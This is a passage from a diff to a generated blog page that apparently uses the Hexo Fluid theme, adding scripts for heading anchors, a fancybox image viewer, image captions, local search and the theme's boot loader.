+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
 
 
 
 
 
-  </div>
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
 </body>
 </html>
